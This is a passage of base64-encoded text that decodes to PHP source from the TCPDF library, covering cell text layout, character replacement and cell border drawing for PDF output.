kJLy8gc2V0IG5ldyBjaGFyYWN0ZXIgc3BhY2luZwoJCQkJCQkkdGhpcy0+Zm9udF9zcGFjaW5nICs9ICgkdyAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXSAtICR3aWR0aCkgLyAobWF4KCgkdGhpcy0+R2V0TnVtQ2hhcnMoJHR4dCkgLSAxKSwgMSkgKiAoJHRoaXMtPmZvbnRfc3RyZXRjaGluZyAvIDEwMCkpOwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIHNldCBuZXcgaG9yaXpvbnRhbCBzdHJldGNoaW5nCgkJCQkJCSR0aGlzLT5mb250X3N0cmV0Y2hpbmcgKj0gJHJhdGlvOwoJCQkJCX0KCQkJCQkvLyByZWNhbGN1bGF0ZSB0ZXh0IHdpZHRoICh0aGUgdGV4dCBmaWxscyB0aGUgZW50aXJlIGNlbGwpCgkJCQkJJHdpZHRoID0gJHcgLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCQkJLy8gcmVzZXQgYWxpZ25tZW50CgkJCQkJJGFsaWduID0gJyc7CgkJCQl9CgkJCX0KCQkJaWYgKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgIT0gMTAwKSB7CgkJCQkvLyBhcHBseSBmb250IHN0cmV0Y2hpbmcKCQkJCSRycyAuPSBzcHJpbnRmKCdCVCAlRiBUeiBFVCAnLCAkdGhpcy0+Zm9udF9zdHJldGNoaW5nKTsKCQkJfQoJCQlpZiAoJHRoaXMtPmZvbnRfc3BhY2luZyAhPSAwKSB7CgkJCQkvLyBpbmNyZWFzZS9kZWNyZWFzZSBmb250IHNwYWNpbmcKCQkJCSRycyAuPSBzcHJpbnRmKCdCVCAlRiBUYyBFVCAnLCAoJHRoaXMtPmZvbnRfc3BhY2luZyAqICR0aGlzLT5rKSk7CgkJCX0KCQkJaWYgKCR0aGlzLT5Db2xvckZsYWcgQU5EICgkdGhpcy0+dGV4dHJlbmRlcm1vZGUgPCA0KSkgewoJCQkJJHMgLj0gJ3EgJy4kdGhpcy0+VGV4dENvbG9yLicgJzsKCQkJfQoJCQkvLyByZW5kZXJpbmcgbW9kZQoJCQkkcyAuPSBzcHJpbnRmKCdCVCAlZCBUciAlRiB3IEVUICcsICR0aGlzLT50ZXh0cmVuZGVybW9kZSwgKCR0aGlzLT50ZXh0c3Ryb2tld2lkdGggKiAkdGhpcy0+aykpOwoJCQkvLyBjb3VudCBudW1iZXIgb2Ygc3BhY2VzCgkJCSRucyA9IHN1YnN0cl9jb3VudCgkdHh0LCBjaHIoMzIpKTsKCQkJLy8gSnVzdGlmaWNhdGlvbgoJCQkkc3BhY2V3aWR0aCA9IDA7CgkJCWlmICgoJGFsaWduID09ICdKJykgQU5EICgkbnMgPiAwKSkgewoJCQkJaWYgKCR0aGlzLT5pc1VuaWNvZGVGb250KCkpIHsKCQkJCQkvLyBnZXQgc3RyaW5nIHdpZHRoIHdpdGhvdXQgc3BhY2VzCgkJCQkJJHdpZHRoID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKHN0cl9yZXBsYWNlKCcgJywgJycsICR0eHQpKTsKCQkJCQkvLyBjYWxjdWxhdGUgYXZlcmFnZSBzcGFjZSB3aWR0aAoJCQkJCSRzcGFjZXdpZHRoID0gLTEwMDAgKiAoJHcgLSAkd2lkdGggLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10pIC8gKCRucz8kbnM6MSkgLyAoJHRoaXMtPkZvbnRTaXplPyR0aGlzLT5Gb250U2l6ZToxKTsKCQkJCQlpZiAoJHRoaXMtPmZvbnRfc3RyZXRjaGluZyAhPSAxMDApIHsKCQkJCQkJLy8gd29yZCBzcGFjaW5nIGlzIGFmZmVjdGVkIGJ5IHN0cmV0Y2hpbmcKCQkJCQkJJHNwYWNld2lkdGggLz0gKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgLyAxMDApOwoJCQkJCX0KCQkJCQkvLyBzZXQgd29yZCBwb3NpdGlvbiB0byBiZSB1c2VkIHdpdGggVEogb3BlcmF0b3IKCQkJCQkkdHh0MiA9IHN0cl9yZXBsYWNlKGNocigwKS5jaHIoMzIpLCAnKSAnLnNwcmludGYoJyVGJywgJHNwYWNld2lkdGgpLicgKCcsICR0eHQyKTsKCQkJCQkkdW5pY29kZV9qdXN0aWZpY2F0aW9uID0gdHJ1ZTsKCQkJCX0gZWxzZSB7CgkJCQkJLy8gZ2V0IHN0cmluZyB3aWR0aAoJCQkJCSR3aWR0aCA9ICR0eHdpZHRoOwoJCQkJCS8vIG5ldyBzcGFjZSB3aWR0aAoJCQkJCSRzcGFjZXdpZHRoID0gKCgkdyAtICR3aWR0aCAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXSkgLyAoJG5zPyRuczoxKSkgKiAkdGhpcy0+azsKCQkJCQlpZiAoJHRoaXMtPmZvbnRfc3RyZXRjaGluZyAhPSAxMDApIHsKCQkJCQkJLy8gd29yZCBzcGFjaW5nIChUdykgaXMgYWZmZWN0ZWQgYnkgc3RyZXRjaGluZwoJCQkJCQkkc3BhY2V3aWR0aCAvPSAoJHRoaXMtPmZvbnRfc3RyZXRjaGluZyAvIDEwMCk7CgkJCQkJfQoJCQkJCS8vIHNldCB3b3JkIHNwYWNpbmcKCQkJCQkkcnMgLj0gc3ByaW50ZignQlQgJUYgVHcgRVQgJywgJHNwYWNld2lkdGgpOwoJCQkJfQoJCQkJJHdpZHRoID0gJHcgLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCX0KCQkJLy8gcmVwbGFjZSBjYXJyaWFnZSByZXR1cm4gY2hhcmFjdGVycwoJCQkkdHh0MiA9IHN0cl9yZXBsYWNlKCJcciIsICcgJywgJHR4dDIpOwoJCQlzd2l0Y2ggKCRhbGlnbikgewoJCQkJY2FzZSAnQyc6IHsKCQkJCQkkZHggPSAoJHcgLSAkd2lkdGgpIC8gMjsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ1InOiB7CgkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJJGR4ID0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSRkeCA9ICR3IC0gJHdpZHRoIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddOwoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0wnOiB7CgkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJJGR4ID0gJHcgLSAkd2lkdGggLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ107CgkJCQkJfSBlbHNlIHsKCQkJCQkJJGR4ID0gJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddOwoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0onOgoJCQkJZGVmYXVsdDogewoJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCSRkeCA9ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkZHggPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ107CgkJCQkJfQoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkeGR4ID0gJHggLSAkZHggLSAkd2lkdGg7CgkJCX0gZWxzZSB7CgkJCQkkeGR4ID0gJHggKyAkZHg7CgkJCX0KCQkJJHhkayA9ICR4ZHggKiAkazsKCQkJLy8gcHJpbnQgdGV4dAoJCQkkcyAuPSBzcHJpbnRmKCdCVCAlRiAlRiBUZCBbKCVzKV0gVEogRVQnLCAkeGRrLCAoKCR0aGlzLT5oIC0gJGJhc2Vmb250eSkgKiAkayksICR0eHQyKTsKCQkJaWYgKGlzc2V0KCR1bmlibG9jaykpIHsgLy8gQHBocHN0YW4taWdub3JlLWxpbmUKCQkJCS8vIHByaW50IG92ZXJsYXBwaW5nIGNoYXJhY3RlcnMgYXMgc2VwYXJhdGUgc3RyaW5nCgkJCQkkeHNoaWZ0ID0gMDsgLy8gaG9yaXpvbnRhbCBzaGlmdAoJCQkJJHR5ID0gKCgkdGhpcy0+aCAtICRiYXNlZm9udHkgKyAoMC4yICogJHRoaXMtPkZvbnRTaXplKSkgKiAkayk7CgkJCQkkc3B3ID0gKCgkdyAtICR0eHdpZHRoIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddKSAvICgkbnM/JG5zOjEpKTsKCQkJCWZvcmVhY2ggKCR1bmlibG9jayBhcyAkdWsgPT4gJHVuaWFycikgeyAvLyBAcGhwc3Rhbi1pZ25vcmUtbGluZQoJCQkJCWlmICgoJHVrICUgMikgPT0gMCkgewoJCQkJCQkvLyB4IHNwYWNlIHRvIHNraXAKCQkJCQkJaWYgKCRzcGFjZXdpZHRoICE9IDApIHsKCQkJCQkJCS8vIGp1c3RpZmljYXRpb24gc2hpZnQKCQkJCQkJCSR4c2hpZnQgKz0gKGNvdW50KGFycmF5X2tleXMoJHVuaWFyciwgMzIpKSAqICRzcHcpOwoJCQkJCQl9CgkJCQkJCSR4c2hpZnQgKz0gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKCR1bmlhcnIpOyAvLyArIHNoaWZ0IGp1c3RpZmljYXRpb24KCQkJCQl9IGVsc2UgewoJCQkJCQkvLyBjaGFyYWN0ZXIgdG8gcHJpbnQKCQkJCQkJJHRvcGNociA9IFRDUERGX0ZPTlRTOjphcnJVVEY4VG9VVEYxNkJFKCR1bmlhcnIsIGZhbHNlKTsKCQkJCQkJJHRvcGNociA9IFRDUERGX1NUQVRJQzo6X2VzY2FwZSgkdG9wY2hyKTsKCQkJCQkJJHMgLj0gc3ByaW50ZignIEJUICVGICVGIFRkIFsoJXMpXSBUSiBFVCcsICgkeGRrICsgKCR4c2hpZnQgKiAkaykpLCAkdHksICR0b3BjaHIpOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQlpZiAoJHRoaXMtPnVuZGVybGluZSkgewoJCQkJJHMgLj0gJyAnLiR0aGlzLT5fZG91bmRlcmxpbmV3KCR4ZHgsICRiYXNlZm9udHksICR3aWR0aCk7CgkJCX0KCQkJaWYgKCR0aGlzLT5saW5ldGhyb3VnaCkgewoJCQkJJHMgLj0gJyAnLiR0aGlzLT5fZG9saW5ldGhyb3VnaHcoJHhkeCwgJGJhc2Vmb250eSwgJHdpZHRoKTsKCQkJfQoJCQlpZiAoJHRoaXMtPm92ZXJsaW5lKSB7CgkJCQkkcyAuPSAnICcuJHRoaXMtPl9kb292ZXJsaW5ldygkeGR4LCAkYmFzZWZvbnR5LCAkd2lkdGgpOwoJCQl9CgkJCWlmICgkdGhpcy0+Q29sb3JGbGFnIEFORCAoJHRoaXMtPnRleHRyZW5kZXJtb2RlIDwgNCkpIHsKCQkJCSRzIC49ICcgUSc7CgkJCX0KCQkJaWYgKCRsaW5rKSB7CgkJCQkkdGhpcy0+TGluaygkeGR4LCAkeXQsICR3aWR0aCwgKCR0aGlzLT5Gb250QXNjZW50ICsgJHRoaXMtPkZvbnREZXNjZW50KSwgJGxpbmssICRucyk7CgkJCX0KCQl9CgkJLy8gb3V0cHV0IGNlbGwKCQlpZiAoJHMpIHsKCQkJLy8gb3V0cHV0IGNlbGwKCQkJJHJzIC49ICRzOwoJCQlpZiAoJHRoaXMtPmZvbnRfc3BhY2luZyAhPSAwKSB7CgkJCQkvLyByZXNldCBmb250IHNwYWNpbmcgbW9kZQoJCQkJJHJzIC49ICcgQlQgMCBUYyBFVCc7CgkJCX0KCQkJaWYgKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgIT0gMTAwKSB7CgkJCQkvLyByZXNldCBmb250IHN0cmV0Y2hpbmcgbW9kZQoJCQkJJHJzIC49ICcgQlQgMTAwIFR6IEVUJzsKCQkJfQoJCX0KCQkvLyByZXNldCB3b3JkIHNwYWNpbmcKCQlpZiAoISR0aGlzLT5pc1VuaWNvZGVGb250KCkgQU5EICgkYWxpZ24gPT0gJ0onKSkgewoJCQkkcnMgLj0gJyBCVCAwIFR3IEVUJzsKCQl9CgkJLy8gcmVzZXQgc3RyZXRjaGluZyBhbmQgc3BhY2luZwoJCSR0aGlzLT5mb250X3N0cmV0Y2hpbmcgPSAkcHJldl9mb250X3N0cmV0Y2hpbmc7CgkJJHRoaXMtPmZvbnRfc3BhY2luZyA9ICRwcmV2X2ZvbnRfc3BhY2luZzsKCQkkdGhpcy0+bGFzdGggPSAkaDsKCQlpZiAoJGxuID4gMCkgewoJCQkvL0dvIHRvIHRoZSBiZWdpbm5pbmcgb2YgdGhlIG5leHQgbGluZQoJCQkkdGhpcy0+eSA9ICR5ICsgJGggKyAkdGhpcy0+Y2VsbF9tYXJnaW5bJ0InXTsKCQkJaWYgKCRsbiA9PSAxKSB7CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT54ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbjsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnggPSAkdGhpcy0+bE1hcmdpbjsKCQkJCX0KCQkJfQoJCX0gZWxzZSB7CgkJCS8vIGdvIGxlZnQgb3IgcmlnaHQgYnkgY2FzZQoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHRoaXMtPnggPSAkeCAtICR3IC0gJHRoaXMtPmNlbGxfbWFyZ2luWydMJ107CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+eCA9ICR4ICsgJHcgKyAkdGhpcy0+Y2VsbF9tYXJnaW5bJ1InXTsKCQkJfQoJCX0KCQkkZ3N0eWxlcyA9ICcnLiR0aGlzLT5saW5lc3R5bGVXaWR0aC4nICcuJHRoaXMtPmxpbmVzdHlsZUNhcC4nICcuJHRoaXMtPmxpbmVzdHlsZUpvaW4uJyAnLiR0aGlzLT5saW5lc3R5bGVEYXNoLicgJy4kdGhpcy0+RHJhd0NvbG9yLicgJy4kdGhpcy0+RmlsbENvbG9yLiJcbiI7CgkJJHJzID0gJGdzdHlsZXMuJHJzOwoJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSAkcHJldl9jZWxsX3BhZGRpbmc7CgkJJHRoaXMtPmNlbGxfbWFyZ2luID0gJHByZXZfY2VsbF9tYXJnaW47CgkJcmV0dXJuICRyczsKCX0KCgkvKioKCSAqIFJlcGxhY2UgYSBjaGFyIGlmIGlzIGRlZmluZWQgb24gdGhlIGN1cnJlbnQgZm9udC4KCSAqIEBwYXJhbSBpbnQgJG9sZGNoYXIgSW50ZWdlciBjb2RlICh1bmljb2RlKSBvZiB0aGUgY2hhcmFjdGVyIHRvIHJlcGxhY2UuCgkgKiBAcGFyYW0gaW50ICRuZXdjaGFyIEludGVnZXIgY29kZSAodW5pY29kZSkgb2YgdGhlIG5ldyBjaGFyYWN0ZXIuCgkgKiBAcmV0dXJuIGludCB0aGUgcmVwbGFjZWQgY2hhciBvciB0aGUgb2xkIGNoYXIgaW4gY2FzZSB0aGUgbmV3IGNoYXIgaSBub3QgZGVmaW5lZAoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xNjcgKDIwMTItMDYtMjIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiByZXBsYWNlQ2hhcigkb2xkY2hhciwgJG5ld2NoYXIpIHsKCQlpZiAoJHRoaXMtPmlzQ2hhckRlZmluZWQoJG5ld2NoYXIpKSB7CgkJCS8vIGFkZCB0aGUgbmV3IGNoYXIgb24gdGhlIHN1YnNldCBsaXN0CgkJCSR0aGlzLT5DdXJyZW50Rm9udFsnc3Vic2V0Y2hhcnMnXVskbmV3Y2hhcl0gPSB0cnVlOwoJCQkvLyByZXR1cm4gdGhlIG5ldyBjaGFyYWN0ZXIKCQkJcmV0dXJuICRuZXdjaGFyOwoJCX0KCQkvLyByZXR1cm4gdGhlIG9sZCBjaGFyCgkJcmV0dXJuICRvbGRjaGFyOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgY29kZSB0byBkcmF3IHRoZSBjZWxsIGJvcmRlcgoJICogQHBhcmFtIGZsb2F0ICR4IFggY29vcmRpbmF0ZS4KCSAqIEBwYXJhbSBmbG9hdCAkeSBZIGNvb3JkaW5hdGUuCgkgKiBAcGFyYW0gZmxvYXQgJHcgQ2VsbCB3aWR0aC4KCSAqIEBwYXJhbSBmbG9hdCAkaCBDZWxsIGhlaWdodC4KCSAqIEBwYXJhbSBzdHJpbmd8YXJyYXl8aW50ICRicmQgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHJldHVybiBzdHJpbmcgY29udGFpbmluZyBjZWxsIGJvcmRlciBjb2RlCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2VlIFNldExpbmVTdHlsZSgpCgkgKiBAc2luY2UgNS43LjAwMCAoMjAxMC0wOC0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGdldENlbGxCb3JkZXIoJHgsICR5LCAkdywgJGgsICRicmQpIHsKCQkkcyA9ICcnOyAvLyBzdHJpbmcgdG8gYmUgcmV0dXJuZWQKCQlpZiAoZW1wdHkoJGJyZCkpIHsKCQkJcmV0dXJuICRzOwoJCX0KCQlpZiAoJGJyZCA9PSAxKSB7CgkJCSRicmQgPSBhcnJheSgnTFJUQicgPT4gdHJ1ZSk7CgkJfQoJCS8vIGNhbGN1bGF0ZSBjb29yZGluYXRlcyBmb3IgYm9yZGVyCgkJJGsgPSAkdGhpcy0+azsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeGVMID0gKCR4IC0gJHcpICogJGs7CgkJCSR4ZVIgPSAkeCAqICRrOwoJCX0gZWxzZSB7CgkJCSR4ZUwgPSAkeCAqICRrOwoJCQkkeGVSID0gKCR4ICsgJHcpICogJGs7CgkJfQoJCSR5ZUwgPSAoKCR0aGlzLT5oIC0gKCR5ICsgJGgpKSAqICRrKTsKCQkkeWVUID0gKCgkdGhpcy0+aCAtICR5KSAqICRrKTsKCQkkeGVUID0gJHhlTDsKCQkkeGVCID0gJHhlUjsKCQkkeWVSID0gJHllVDsKCQkkeWVCID0gJHllTDsKCQlpZiAoaXNfc3RyaW5nKCRicmQpKSB7CgkJCS8vIGNvbnZlcnQgc3RyaW5nIHRvIGFycmF5CgkJCSRzbGVuID0gc3RybGVuKCRicmQpOwoJCQkkbmV3YnJkID0gYXJyYXkoKTsKCQkJZm9yICgkaSA9IDA7ICRpIDwgJHNsZW47ICsrJGkpIHsKCQkJCSRuZXdicmRbJGJyZFskaV1dID0gYXJyYXkoJ2NhcCcgPT4gJ3NxdWFyZScsICdqb2luJyA9PiAnbWl0ZXInKTsKCQkJfQoJCQkkYnJkID0gJG5ld2JyZDsKCQl9CgkJaWYgKGlzc2V0KCRicmRbJ21vZGUnXSkpIHsKCQkJJG1vZGUgPSAkYnJkWydtb2RlJ107CgkJCXVuc2V0KCRicmRbJ21vZGUnXSk7CgkJfSBlbHNlIHsKCQkJJG1vZGUgPSAnbm9ybWFsJzsKCQl9CgkJZm9yZWFjaCAoJGJyZCBhcyAkYm9yZGVyID0+ICRzdHlsZSkgewoJCQlpZiAoaXNfYXJyYXkoJHN0eWxlKSBBTkQgIWVtcHR5KCRzdHlsZSkpIHsKCQkJCS8vIGFwcGx5IGJvcmRlciBzdHlsZQoJCQkJJHByZXZfc3R5bGUgPSAkdGhpcy0+bGluZXN0eWxlV2lkdGguJyAnLiR0aGlzLT5saW5lc3R5bGVDYXAuJyAnLiR0aGlzLT5saW5lc3R5bGVKb2luLicgJy4kdGhpcy0+bGluZXN0eWxlRGFzaC4nICcuJHRoaXMtPkRyYXdDb2xvci4nICc7CgkJCQkkcyAuPSAkdGhpcy0+c2V0TGluZVN0eWxlKCRzdHlsZSwgdHJ1ZSkuIlxuIjsKCQkJfQoJCQlzd2l0Y2ggKCRtb2RlKSB7CgkJCQljYXNlICdleHQnOiB7CgkJCQkJJG9mZiA9ICgoJHRoaXMtPkxpbmVXaWR0aCAvIDIpICogJGspOwoJCQkJCSR4TCA9ICR4ZUwgLSAkb2ZmOwoJCQkJCSR4UiA9ICR4ZVIgKyAkb2ZmOwoJCQkJCSR5VCA9ICR5ZVQgKyAkb2ZmOwoJCQkJCSR5TCA9ICR5ZUwgLSAkb2ZmOwoJCQkJCSR4VCA9ICR4TDsKCQkJCQkkeEIgPSAkeFI7CgkJCQkJJHlSID0gJHlUOwoJCQkJCSR5QiA9ICR5TDsKCQkJCQkkdyArPSAkdGhpcy0+TGluZVdpZHRoOwoJCQkJCSRoICs9ICR0aGlzLT5MaW5lV2lkdGg7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdpbnQnOiB7CgkJCQkJJG9mZiA9ICgkdGhpcy0+TGluZVdpZHRoIC8gMikgKiAkazsKCQkJCQkkeEwgPSAkeGVMICsgJG9mZjsKCQkJCQkkeFIgPSAkeGVSIC0gJG9mZjsKCQkJCQkkeVQgPSAkeWVUIC0gJG9mZjsKCQkJCQkkeUwgPSAkeWVMICsgJG9mZjsKCQkJCQkkeFQgPSAkeEw7CgkJCQkJJHhCID0gJHhSOwoJCQkJCSR5UiA9ICR5VDsKCQkJCQkkeUIgPSAkeUw7CgkJCQkJJHcgLT0gJHRoaXMtPkxpbmVXaWR0aDsKCQkJCQkkaCAtPSAkdGhpcy0+TGluZVdpZHRoOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnbm9ybWFsJzoKCQkJCWRlZmF1bHQ6IHsKCQkJCQkkeEwgPSAkeGVMOwoJCQkJCSR4VCA9ICR4ZVQ7CgkJCQkJJHhCID0gJHhlQjsKCQkJCQkkeFIgPSAkeGVSOwoJCQkJCSR5TCA9ICR5ZUw7CgkJCQkJJHlUID0gJHllVDsKCQkJCQkkeUIgPSAkeWVCOwoJCQkJCSR5UiA9ICR5ZVI7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJLy8gZHJhdyBib3JkZXJzIGJ5IGNhc2UKCQkJaWYgKHN0cmxlbigkYm9yZGVyKSA9PSA0KSB7CgkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiAlRiAlRiByZSBTICcsICR4VCwgJHlULCAoJHcgKiAkayksICgtJGggKiAkaykpOwoJCQl9IGVsc2VpZiAoc3RybGVuKCRib3JkZXIpID09IDMpIHsKCQkJCWlmIChzdHJwb3MoJGJvcmRlciwnQicpID09PSBmYWxzZSkgeyAvLyBMVFIKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBtICcsICR4TCwgJHlMKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4VCwgJHlUKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4UiwgJHlSKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4QiwgJHlCKTsKCQkJCQkkcyAuPSAnUyAnOwoJCQkJfSBlbHNlaWYgKHN0cnBvcygkYm9yZGVyLCdMJykgPT09IGZhbHNlKSB7IC8vIFRSQgoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhULCAkeVQpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhSLCAkeVIpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhCLCAkeUIpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhMLCAkeUwpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9IGVsc2VpZiAoc3RycG9zKCRib3JkZXIsJ1QnKSA9PT0gZmFsc2UpIHsgLy8gUkJMCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeFIsICR5Uik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEIsICR5Qik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEwsICR5TCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFQsICR5VCk7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCX0gZWxzZWlmIChzdHJwb3MoJGJvcmRlciwnUicpID09PSBmYWxzZSkgeyAvLyBCTFQKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBtICcsICR4QiwgJHlCKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4TCwgJHlMKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4VCwgJHlUKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4UiwgJHlSKTsKCQkJCQkkcyAuPSAnUyAnOwoJCQkJfQoJCQl9IGVsc2VpZiAoc3RybGVuKCRib3JkZXIpID09IDIpIHsKCQkJCWlmICgoc3RycG9zKCRib3JkZXIsJ0wnKSAhPT0gZmFsc2UpIEFORCAoc3RycG9zKCRib3JkZXIsJ1QnKSAhPT0gZmFsc2UpKSB7IC8vIExUCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeEwsICR5TCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFQsICR5VCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFIsICR5Uik7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCX0gZWxzZWlmICgoc3RycG9zKCRib3JkZXIsJ1QnKSAhPT0gZmFsc2UpIEFORCAoc3RycG9zKCRib3JkZXIsJ1InKSAhPT0gZmFsc2UpKSB7IC8vIFRSCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeFQsICR5VCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFIsICR5Uik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEIsICR5Qik7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCX0gZWxzZWlmICgoc3RycG9zKCRib3JkZXIsJ1InKSAhPT0gZmFsc2UpIEFORCAoc3RycG9zKCRib3JkZXIsJ0InKSAhPT0gZmFsc2UpKSB7IC8vIFJCCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeFIsICR5Uik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEIsICR5Qik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEwsICR5TCk7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCX0gZWxzZWlmICgoc3RycG9zKCRib3JkZXIsJ0InKSAhPT0gZmFsc2UpIEFORCAoc3RycG9zKCRib3JkZXIsJ0wnKSAhPT0gZmFsc2UpKSB7IC8vIEJMCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeEIsICR5Qik7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeEwsICR5TCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFQsICR5VCk7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCX0gZWxzZWlmICgoc3RycG9zKCRib3JkZXIsJ0wnKSAhPT0gZmFsc2UpIEFORCAoc3RycG9zKCRib3JkZXIsJ1InKSAhPT0gZmFsc2UpKSB7IC8vIExSCgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbSAnLCAkeEwsICR5TCk7CgkJCQkJJHMgLj0gc3ByaW50ZignJUYgJUYgbCAnLCAkeFQsICR5VCk7CgkJCQkJJHMgLj0gJ1MgJzsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBtICcsICR4UiwgJHlSKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4QiwgJHlCKTsKCQkJCQkkcyAuPSAnUyAnOwoJCQkJfSBlbHNlaWYgKChzdHJwb3MoJGJvcmRlciwnVCcpICE9PSBmYWxzZSkgQU5EIChzdHJwb3MoJGJvcmRlciwnQicpICE9